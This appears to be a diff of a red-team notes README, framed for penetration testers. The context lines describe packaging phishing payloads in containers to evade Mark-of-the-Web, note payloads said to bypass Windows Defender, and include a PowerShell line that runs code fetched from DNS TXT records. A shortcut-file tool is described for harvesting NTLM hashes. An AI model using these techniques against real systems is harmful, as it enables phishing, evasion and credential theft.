@@ -176,9 +176,7 @@ HostUrl=https://s28.q4cdn.com/392171258/files/doc_downloads/test.pdf
 
 MotW is troublesome when phishing because Windows may present additional security warnings to the user when attempting to open or run files that have it.  Some files, such as Office documents, will not enable macros if MotW is present.
 
-Containers provide a means of bundling your dependencies (trigger, payload, and decoy) into a single file.  This simplifies the process of sending multiple files to a victim and can add a level of obfuscation (e.g. if they can be password protected).  The ISO/IMG, ZIP, and WIM formats are solid choices as they're natively supported by Windows.  You could go for something like 7z, Gz, or WinRAR, but a victim may not have the required software available to interact with them.  You can package your files manually, or use a tool such as mgeeky's PackMyPayload.  Some of these container formats support hidden files, and some do not propagate MotW.  This [repository](https://github.com/nmantani/archiver-MOTW-support-comparison) by Nobutaka Mantani contains a comparison of MotW propagations.
-Ref[PackMyPayload]: https://github.com/mgeeky/PackMyPayload
-
+Containers provide a means of bundling your dependencies (trigger, payload, and decoy) into a single file.  This simplifies the process of sending multiple files to a victim and can add a level of obfuscation (e.g. if they can be password protected).  The ISO/IMG, ZIP, and WIM formats are solid choices as they're natively supported by Windows.  You could go for something like 7z, Gz, or WinRAR, but a victim may not have the required software available to interact with them.  You can package your files manually, or use a tool such as mgeeky's [PackMyPayload](https://github.com/mgeeky/PackMyPayload).  Some of these container formats support hidden files, and some do not propagate MotW.  This [repository](https://github.com/nmantani/archiver-MOTW-support-comparison) by Nobutaka Mantani contains a comparison of MotW propagations.
 
 ### [111] The following payloads was tested successfully against Windows Defender.
 
@@ -210,7 +208,7 @@ ps> (Resolve-DnsName domain_oneline.txt -Type TXT).strings -join '' | iex
 
 [3] Leak Link NTLM Relay
 
-[*leaklink*](./tools/leaklink/) is used for uploading malicious shortcut files to insecure file shares. The vulnerability exists due to Windows looking for an icon file to associate with the shortcut file it will activate with the right click  on the file. This icon file can be directed to a penetration tester's machine running Responder or smbserver to gather NTLMv1 or NTLMv2 hashes (depending on configuration of the victim host machine). The tester can then attempt to crack those collected hashes offline with a tool like Hashcat, or relay them to a tool like ntlmrelayx for further exploitation.
+[leaklink.py](./tools/leaklink/) is used for uploading malicious shortcut files to insecure file shares. The vulnerability exists due to Windows looking for an icon file to associate with the shortcut file it will activate with the right click  on the file. This icon file can be directed to a penetration tester's machine running Responder or smbserver to gather NTLMv1 or NTLMv2 hashes (depending on configuration of the victim host machine). The tester can then attempt to crack those collected hashes offline with a tool like Hashcat, or relay them to a tool like ntlmrelayx for further exploitation.
 Running the python script:
 
 ```bash
